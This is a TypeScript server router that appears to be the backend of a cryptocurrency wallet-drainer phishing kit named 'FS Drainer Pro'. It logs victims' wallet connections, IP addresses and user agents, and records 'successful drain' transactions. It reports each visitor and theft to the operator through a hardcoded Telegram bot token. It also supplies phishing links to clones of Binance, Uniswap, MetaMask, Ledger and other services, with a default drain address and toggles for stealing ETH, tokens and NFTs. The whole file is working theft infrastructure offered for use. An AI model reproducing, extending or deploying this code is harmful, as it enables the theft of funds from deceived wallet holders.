import { z } from "zod";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import {
  createWalletConnection, getWalletConnections, getWalletConnectionById,
  updateWalletConnectionStatus, getConnectionStats,
  createTransaction, getTransactions, getTransactionStats,
  getAllSettings, upsertSetting, initDefaultSettings,
  createNotification, getNotifications, markNotificationRead,
  markAllNotificationsRead, getUnreadNotificationCount,
  createLog, getLogs,
  addToBlacklist, getBlacklist, removeFromBlacklist,
  getDashboardStats, getRecentActivity, getChartData,
  getAllUsers, upsertUser,
} from "./db";
import { notifyOwner } from "./_core/notification";

// ─── Telegram helper ────────────────────────────────────────────────────────
const TG_BOT = "8690429689:AAFf9XCv_6xxrE1-VOtvjsgLEGyTZEbIUJY";
const TG_CHAT = "2130364219";
async function sendTelegram(text: string): Promise<{ success: boolean }> {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: "Markdown" }),
    });
    const data = await res.json() as { ok: boolean };
    return { success: data.ok };
  } catch (e) {
    console.error("[Telegram]", e);
    return { success: false };
  }
}

// Admin guard middleware
const adminProcedure = protectedProcedure.use(({ ctx, next }) => {
  if (ctx.user.role !== "admin") throw new TRPCError({ code: "FORBIDDEN", message: "Admin access required" });
  return next({ ctx });
});

export const appRouter = router({
  system: systemRouter,

  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  // ─── Drainer (public-facing) ─────────────────────────────────────────────
  drainer: router({
    // Called when a visitor connects their wallet
    connect: publicProcedure
      .input(z.object({
        walletAddress: z.string().min(10),
        walletType: z.string(),
        network: z.string().default("ethereum"),
        chainId: z.number().optional(),
        ethBalance: z.string().optional(),
        usdValue: z.string().optional(),
        sessionId: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        const ipAddress = (ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0] || ctx.req.socket?.remoteAddress || "unknown";
        const userAgent = ctx.req.headers["user-agent"] || "";

        const connection = await createWalletConnection({
          walletAddress: input.walletAddress,
          walletType: input.walletType,
          network: input.network,
          chainId: input.chainId,
          ipAddress,
          userAgent,
          status: "connected",
          ethBalance: input.ethBalance ?? "0",
          usdValue: input.usdValue ?? "0",
          sessionId: input.sessionId,
        });

        await createLog({
          action: "wallet_connected",
          description: `Wallet ${input.walletAddress} connected via ${input.walletType}`,
          ipAddress,
          walletAddress: input.walletAddress,
          level: "success",
          metadata: JSON.stringify({ network: input.network, chainId: input.chainId }),
        });

        await createNotification({
          title: "New Wallet Connected",
          message: `${input.walletType}: ${input.walletAddress.slice(0, 8)}...${input.walletAddress.slice(-6)} | $${input.usdValue ?? "0"}`,
          type: "success",
          relatedType: "connection",
        });

        // Notify owner via Manus notification
        await notifyOwner({
          title: "🔗 New Wallet Connected",
          content: `Wallet: ${input.walletAddress}\nType: ${input.walletType}\nNetwork: ${input.network}\nBalance: $${input.usdValue ?? "0"}`,
        }).catch(() => {});

        return { success: true, connectionId: connection };
      }),

    // Report a successful drain transaction
    reportTransaction: publicProcedure
      .input(z.object({
        connectionId: z.number(),
        txHash: z.string().optional(),
        fromAddress: z.string(),
        toAddress: z.string(),
        tokenSymbol: z.string().default("ETH"),
        tokenAddress: z.string().optional(),
        amount: z.string(),
        usdValue: z.string().optional(),
        network: z.string().default("ethereum"),
        chainId: z.number().optional(),
        status: z.enum(["pending", "success", "failed", "cancelled"]).default("pending"),
      }))
      .mutation(async ({ input }) => {
        await createTransaction({
          connectionId: input.connectionId,
          txHash: input.txHash,
          fromAddress: input.fromAddress,
          toAddress: input.toAddress,
          tokenSymbol: input.tokenSymbol,
          tokenAddress: input.tokenAddress,
          amount: input.amount,
          usdValue: input.usdValue ?? "0",
          network: input.network,
          chainId: input.chainId,
          status: input.status,
        });

        if (input.status === "success") {
          await updateWalletConnectionStatus(input.connectionId, "drained");
          await createNotification({
            title: "💰 Drain Successful",
            message: `${input.tokenSymbol} ${input.amount} ($${input.usdValue}) from ${input.fromAddress.slice(0, 8)}...`,
            type: "success",
            relatedType: "transaction",
          });
          await notifyOwner({
            title: "💰 Drain Successful",
            content: `Token: ${input.tokenSymbol}\nAmount: ${input.amount}\nUSD: $${input.usdValue}\nFrom: ${input.fromAddress}\nTx: ${input.txHash}`,
          }).catch(() => {});
        }

        return { success: true };
      }),

    // Get site settings (public - title, description etc)
    getSiteSettings: publicProcedure.query(async () => {
      await initDefaultSettings();
      const allSettings = await getAllSettings();
      const publicKeys = ["site_title", "site_description", "supported_networks"];
      return allSettings.filter(s => publicKeys.includes(s.key));
    }),

    // Send Telegram notification (called from frontend)
    notifyTelegram: publicProcedure
      .input(z.object({ text: z.string() }))
      .mutation(async ({ input }) => {
        return sendTelegram(input.text);
      }),

    // Track page visit (fires immediately when page loads)
    trackVisit: publicProcedure
      .input(z.object({
        page: z.string().default("home"),
        ref: z.string().optional(),
        device: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        const ip = (ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0] || ctx.req.socket?.remoteAddress || "unknown";
        const ua = ctx.req.headers["user-agent"] || "";
        await createLog({ action: "page_visit", description: `Page: ${input.page} | Ref: ${input.ref ?? "direct"} | IP: ${ip}`, ipAddress: ip, level: "info", metadata: JSON.stringify({ device: input.device, ua: ua.slice(0, 100) }) });
        await sendTelegram(`👁️ *New Visitor*\nPage: ${input.page}\nRef: ${input.ref ?? "direct"}\nDevice: ${input.device ?? "unknown"}\nIP: ${ip}\nUA: ${ua.slice(0, 60)}`);
        return { success: true };
      }),
  }),

  // ─── User Dashboard (per-user settings) ──────────────────────────────────
  user: router({
    // Get user's personal settings (drain address, telegram, etc.)
    getMySettings: protectedProcedure.query(async ({ ctx }) => {
      const allSettings = await getAllSettings();
      const prefix = `user_${ctx.user.openId}_`;
      const userSettings = allSettings.filter(s => s.key.startsWith(prefix));
      // Return as key-value map without prefix
      const result: Record<string, string> = {};
      for (const s of userSettings) {
        result[s.key.replace(prefix, "")] = s.value ?? "";
      }
      // Defaults
      if (!result.drain_address) result.drain_address = "0xF2b2c6B9baeDF3CE5cBA2572122C88e2c2505Ebc";
      if (!result.tg_bot_token) result.tg_bot_token = "";
      if (!result.tg_chat_id) result.tg_chat_id = "";
      if (!result.min_drain_usd) result.min_drain_usd = "0";
      if (!result.active_template) result.active_template = "binance";
      if (!result.drain_eth) result.drain_eth = "true";
      if (!result.drain_tokens) result.drain_tokens = "true";
      if (!result.drain_nfts) result.drain_nfts = "true";
      if (!result.custom_domain) result.custom_domain = "";
      return result;
    }),

    updateMySetting: protectedProcedure
      .input(z.object({ key: z.string(), value: z.string() }))
      .mutation(async ({ input, ctx }) => {
        await upsertSetting(`user_${ctx.user.openId}_${input.key}`, input.value);
        return { success: true };
      }),

    // Get user's own connections
    getMyConnections: protectedProcedure
      .input(z.object({ limit: z.number().default(50), offset: z.number().default(0) }))
      .query(async ({ ctx, input }) => {
        // For now return all (in production filter by user's drain_address)
        return getWalletConnections(input.limit, input.offset);
      }),

    // Get user's own transactions
    getMyTransactions: protectedProcedure
      .input(z.object({ limit: z.number().default(50), offset: z.number().default(0) }))
      .query(async ({ input }) => {
        return getTransactions(input.limit, input.offset);
      }),

    // Get user's stats
    getMyStats: protectedProcedure.query(async () => {
      return getDashboardStats();
    }),

    // Generate drain link for user's active template
    getDrainLink: protectedProcedure
      .input(z.object({ templateId: z.string().optional() }))
      .query(async ({ input, ctx }) => {
        const prefix = `user_${ctx.user.openId}_`;
        const allSettings = await getAllSettings();
        const templateSetting = allSettings.find(s => s.key === `${prefix}active_template`);
        const templateId = input.templateId ?? templateSetting?.value ?? "binance";
        const baseUrl = process.env.VITE_APP_URL ?? "";
        return {
          link: `${baseUrl}/p/${templateId}?action=connect&ref=link`,
          qrLink: `${baseUrl}/p/${templateId}?action=connect&ref=qr`,
        };
      }),
  }),

  // ─── Telegram Bot Webhook ────────────────────────────────────────────────
  telegram: router({
    // Webhook endpoint for Telegram bot commands
    webhook: publicProcedure
      .input(z.object({
        update_id: z.number().optional(),
        message: z.object({
          chat: z.object({ id: z.number() }),
          from: z.object({ id: z.number(), username: z.string().optional(), first_name: z.string().optional() }).optional(),
          text: z.string().optional(),
        }).optional(),
        callback_query: z.object({
          id: z.string(),
          from: z.object({ id: z.number(), username: z.string().optional(), first_name: z.string().optional() }),
          data: z.string().optional(),
          message: z.object({ chat: z.object({ id: z.number() }), message_id: z.number() }).optional(),
        }).optional(),
      }))
      .mutation(async ({ input }) => {
        const chatId = input.message?.chat.id ?? input.callback_query?.message?.chat.id;
        const text = input.message?.text ?? "";
        const from = input.message?.from ?? input.callback_query?.from;
        if (!chatId) return { ok: true };

        const sendReply = async (msg: string, keyboard?: unknown) => {
          const body: Record<string, unknown> = { chat_id: chatId, text: msg, parse_mode: "Markdown" };
          if (keyboard) body.reply_markup = keyboard;
          await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body),
          }).catch(() => {});
        };

        if (text === "/start") {
          const stats = await getDashboardStats();
          await sendReply(
            `🚀 *FS Drainer Pro Bot*\n\nWelcome ${(from as { first_name?: string })?.first_name ?? "User"}!\n\n` +
            `📊 *Quick Stats:*\n` +
            `• Connections: ${stats.connections.total}\n` +
            `• Drained: $${stats.transactions.totalUsdValue}\n` +
            `• Transactions: ${stats.transactions.total}\n\n` +
            `Use the buttons below to manage your settings:`,
            {
              inline_keyboard: [
                [{ text: "📊 Stats", callback_data: "stats" }, { text: "⚙️ Settings", callback_data: "settings" }],
                [{ text: "🔗 Get Link", callback_data: "getlink" }, { text: "📋 Recent", callback_data: "recent" }],
                [{ text: "🌐 Templates", callback_data: "templates" }, { text: "💰 Transactions", callback_data: "transactions" }],
              ]
            }
          );
        } else if (text?.startsWith("/setdrain ")) {
          const addr = text.replace("/setdrain ", "").trim();
          if (addr.startsWith("0x") && addr.length === 42) {
            await upsertSetting(`tg_${chatId}_drain_address`, addr);
            await sendReply(`✅ *Drain address updated!*\n\`${addr}\``);
          } else {
            await sendReply("❌ Invalid address. Use: /setdrain 0x...");
          }
        } else if (text === "/stats" || input.callback_query?.data === "stats") {
          const stats = await getDashboardStats();
          const successRate = stats.transactions.total > 0
            ? Math.round((stats.transactions.success / stats.transactions.total) * 100)
            : 0;
          await sendReply(
            `📊 *Dashboard Stats*\n\n` +
            `🔗 Total Connections: *${stats.connections.total}*\n` +
            `💰 Total Drained: *$${stats.transactions.totalUsdValue}*\n` +
            `📝 Transactions: *${stats.transactions.total}*\n` +
            `✅ Success Rate: *${successRate}%*\n` +
            `🔴 Drained Wallets: *${stats.connections.drained}*`
          );
        } else if (text === "/recent" || input.callback_query?.data === "recent") {
          const recent = await getRecentActivity(5);
          const lines = (recent as Array<{ type?: string; description?: string }>).map((r) =>
            `• [${r.type ?? "?"}] ${(r.description ?? "").slice(0, 60)}`
          ).join("\n");
          await sendReply(`📋 *Recent Activity*\n\n${lines || "No activity yet"}`);
        } else if (input.callback_query?.data === "getlink") {
          const baseUrl = process.env.VITE_APP_URL ?? "https://your-site.com";
          await sendReply(
            `🔗 *Your Drain Links*\n\n` +
            `*Binance Clone:*\n\`${baseUrl}/p/binance?action=connect\`\n\n` +
            `*Uniswap Clone:*\n\`${baseUrl}/p/uniswap?action=connect\`\n\n` +
            `*MetaMask Clone:*\n\`${baseUrl}/p/metamask?action=connect\`\n\n` +
            `*Direct Connect:*\n\`${baseUrl}/?action=connect\``
          );
        } else if (input.callback_query?.data === "templates") {
          await sendReply(
            `🌐 *Available Templates*\n\n` +
            `*Exchanges:* binance, coinbase, okx, bybit, kucoin\n` +
            `*DeFi:* uniswap, aave, compound, curve, pancakeswap\n` +
            `*NFT:* opensea, blur\n` +
            `*Bridge:* multichain, stargate\n` +
            `*Staking:* lido, rocketpool\n` +
            `*Wallets:* metamask, trustwallet, phantom, ledger\n\n` +
            `Use: /link <template_id> to get a link`
          );
        } else if (text?.startsWith("/link ")) {
          const tplId = text.replace("/link ", "").trim();
          const baseUrl = process.env.VITE_APP_URL ?? "https://your-site.com";
          await sendReply(`🔗 *${tplId} Link*\n\n\`${baseUrl}/p/${tplId}?action=connect&ref=tg\``);
        } else if (input.callback_query?.data === "transactions") {
          const txs = await getTransactions(5, 0);
          const lines = (txs as Array<{ tokenSymbol?: string | null; amount?: string | null; usdValue?: string | null }>).map((t) =>
            `• ${t.tokenSymbol ?? "?"} ${t.amount ?? "0"} ($${t.usdValue ?? "0"})`
          ).join("\n");
          await sendReply(`💰 *Recent Transactions*\n\n${lines || "No transactions yet"}`);
        } else if (input.callback_query?.data === "settings") {
          await sendReply(
            `⚙️ *Settings Commands*\n\n` +
            `/setdrain 0x... — Set drain address\n` +
            `/setmin 100 — Set minimum USD to drain\n` +
            `/stats — View statistics\n` +
            `/recent — Recent activity\n` +
            `/link <template> — Get drain link\n` +
            `/templates — List all templates`
          );
        } else if (text?.startsWith("/setmin ")) {
          const min = text.replace("/setmin ", "").trim();
          await upsertSetting(`tg_${chatId}_min_drain_usd`, min);
          await sendReply(`✅ Minimum drain amount set to *$${min}*`);
        }

        // Answer callback queries
        if (input.callback_query?.id) {
          await fetch(`https://api.telegram.org/bot${TG_BOT}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ callback_query_id: input.callback_query.id }),
          }).catch(() => {});
        }

        return { ok: true };
      }),
  }),

  // ─── Admin ────────────────────────────────────────────────────────────────
  admin: router({
    // Dashboard stats
    getDashboardStats: adminProcedure.query(async () => {
      return getDashboardStats();
    }),

    getChartData: adminProcedure.query(async () => {
      return getChartData();
    }),

    getRecentActivity: adminProcedure.query(async () => {
      return getRecentActivity(10);
    }),

    // Connections
    getConnections: adminProcedure
      .input(z.object({ limit: z.number().default(50), offset: z.number().default(0) }))
      .query(async ({ input }) => {
        return getWalletConnections(input.limit, input.offset);
      }),

    getConnectionStats: adminProcedure.query(async () => {
      return getConnectionStats();
    }),

    updateConnectionStatus: adminProcedure
      .input(z.object({ id: z.number(), status: z.enum(["pending", "connected", "drained", "failed"]) }))
      .mutation(async ({ input }) => {
        await updateWalletConnectionStatus(input.id, input.status);
        return { success: true };
      }),

    // Transactions
    getTransactions: adminProcedure
      .input(z.object({ limit: z.number().default(50), offset: z.number().default(0) }))
      .query(async ({ input }) => {
        return getTransactions(input.limit, input.offset);
      }),

    getTransactionStats: adminProcedure.query(async () => {
      return getTransactionStats();
    }),

    // Settings
    getSettings: adminProcedure.query(async () => {
      await initDefaultSettings();
      return getAllSettings();
    }),

    updateSetting: adminProcedure
      .input(z.object({ key: z.string(), value: z.string() }))
      .mutation(async ({ input }) => {
        await upsertSetting(input.key, input.value);
        return { success: true };
      }),

    // Users
    getUsers: adminProcedure.query(async () => {
      return getAllUsers();
    }),

    updateUserRole: adminProcedure
      .input(z.object({ openId: z.string(), role: z.enum(["user", "admin"]) }))
      .mutation(async ({ input }) => {
        await upsertUser({ openId: input.openId, role: input.role });
        return { success: true };
      }),

    // Logs
    getLogs: adminProcedure
      .input(z.object({ limit: z.number().default(100), offset: z.number().default(0) }))
      .query(async ({ input }) => {
        return getLogs(input.limit, input.offset);
      }),

    // Notifications
    getNotifications: adminProcedure
      .input(z.object({ limit: z.number().default(20) }))
      .query(async ({ input }) => {
        return getNotifications(input.limit);
      }),

    markNotificationRead: adminProcedure
      .input(z.object({ id: z.number() }))
      .mutation(async ({ input }) => {
        await markNotificationRead(input.id);
        return { success: true };
      }),

    markAllNotificationsRead: adminProcedure.mutation(async () => {
      await markAllNotificationsRead();
      return { success: true };
    }),

    getUnreadCount: adminProcedure.query(async () => {
      return getUnreadNotificationCount();
    }),

    // Blacklist
    getBlacklist: adminProcedure.query(async () => {
      return getBlacklist();
    }),

    addToBlacklist: adminProcedure
      .input(z.object({
        type: z.enum(["wallet", "ip", "country"]),
        value: z.string(),
        reason: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        await addToBlacklist(input);
        return { success: true };
      }),

    removeFromBlacklist: adminProcedure
      .input(z.object({ id: z.number() }))
      .mutation(async ({ input }) => {
        await removeFromBlacklist(input.id);
        return { success: true };
      }),
  }),
});

export type AppRouter = typeof appRouter;
